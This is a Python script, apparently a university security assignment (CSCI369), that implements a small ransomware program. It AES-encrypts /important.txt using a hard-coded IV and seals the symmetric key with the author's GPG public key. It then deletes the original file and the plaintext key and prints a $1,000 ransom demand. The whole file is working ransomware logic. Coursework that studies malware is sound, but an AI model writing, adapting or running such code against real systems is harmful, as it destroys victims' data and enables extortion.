import glob
import os
from Crypto.Util.Padding import pad
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
import gpg
import gnupg
from pprint import pprint
import getpass

"""ASSIGNMENT 1
Name: Sally
Student number: 4603229
Subject: CSCI369
"""

def gen_key():
    # hard-coded filename
    filename = "key.txt"

    # symmetric key used = abcdefgh12345678
    symmetric_key = getpass.getpass("Enter the 128-bit symmetric key: ")
    bytes_key = str.encode(symmetric_key)

    # save user input to txt file
    with open(filename, "w") as f:
        f.write(symmetric_key)
    print("symmetric key generated\n")
  
    return bytes_key


def encrypt_files(k, iv):
	# check cwd
    #cwd = os.getcwd()
    #print("Current working directory: %s" % (cwd))
	
	# direct to root folder
    os.chdir('/')
	
	# check cwd again for debugging purpose
    #cwd = os.getcwd()
    #print("Current working directory: %s" % (cwd))
    
    # find files recursively in a folder
    # ref: https://docs.python.org/3/library/glob.html
    # ref: https://www.geeksforgeeks.org/how-to-use-glob-function-to-find-files-recursively-in-python/
    for textfile in glob.glob("important.txt"):
        # with statement to auto close the open file
        # ref: https://cmdlinetips.com/2016/01/opening-a-file-in-python-using-with-statement/
        with open(textfile,"r") as tf:
            file_str = tf.read()                #read string
            file_data = str.encode(file_str)    #string to bytes
            cipher = AES.new(k, AES.MODE_CBC, iv)
            cipher_bytes = cipher.encrypt(pad(file_data,AES.block_size))   
            #print("Encrypted text(bytes): %s" % (cipher_bytes))     

            # create the encrypted_message.asc
            with open(textfile.replace('important.txt', 'encrypted_message.asc'), "w") as file:
                cipher_ascii = b64encode(cipher_bytes)    #bytes to ASCII in bytes
                cipher_ascii_str = cipher_ascii.decode("ascii") #to String
                file.write(cipher_ascii_str)
                #print("Encrypted text(ascii): %s" % (cipher_ascii_str))

        encrypted_filename = textfile.replace('important.txt', 'encrypted_message.asc')
        print(textfile + " was encrypted and saved to " + encrypted_filename + "\n")

      
def encrypt_key(cwd, filename):
	# import
	# print("Importing public key...\n\n")
	gpg = gnupg.GPG(gnupghome=cwd)
	
	with open(cwd + '/sallypubkey.gpg.asc', 'r') as f:
		key_data = f.read()
	import_result = gpg.import_keys(key_data)
	# pprint(import_result.results)
	
	# listing keys
	# print("\nListing keys...")
	# public_keys = gpg.list_keys()
	# private_keys = gpg.list_keys(True)
	# print("Public keys: ")
	# pprint(public_keys)
	# print("Private keys: ")
	# pprint(private_keys)
	
	#https://stackoverflow.com/questions/63714716/gnupg-not-out-puting-encrypted-file
	gpg.trust_keys(import_result.fingerprints, 'TRUST_ULTIMATE')

	# encrypt file
	with open(cwd + '/' + filename, 'rb') as keyfile:
		status = gpg.encrypt_file(keyfile, recipients=['sally@uow.edu.au'], output=('encrypted_key.asc'))
		
		# print("\nEncrypting status...")
		# print (status.ok)
		# print("\n")
		# print (status.status)
		# print("\n")
		# print (status.stderr)
		# print("\n")


def delete_files(cwd):
	# check current working directory
	# print("Current working dir: %s" % (cwd))
	os.remove((cwd + "/key.txt"))
	print("key.txt is successfully deleted\n")

    # direct to root directory to delete important.txt
	os.chdir('/')
	cwd = os.getcwd()
	#print("Current working dir: %s" % (cwd))
	os.remove((cwd + "/important.txt"))
	print("important.txt is successfully deleted\n")


def display_msg():
	print("Your file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send encrypted_key.asc to me")


def main():
    # generate symmetric key
    symmetric_key = gen_key()

    # hard coded IV
    iv = b64decode("nDK8HbarxQl/ZlFO4jA2oQ==")
    
    # hard coded filename
    filename = "key.txt"
    
    # to keep the working directory where the python file is stored
    cwd = os.getcwd()

    # to encrypt important.txt
    encrypt_files(symmetric_key, iv)
    
    # to encrypt the symmetric key
    encrypt_key(cwd, filename)
    
    # delete files
    delete_files(cwd)

    display_msg()


if __name__ == '__main__':
    main()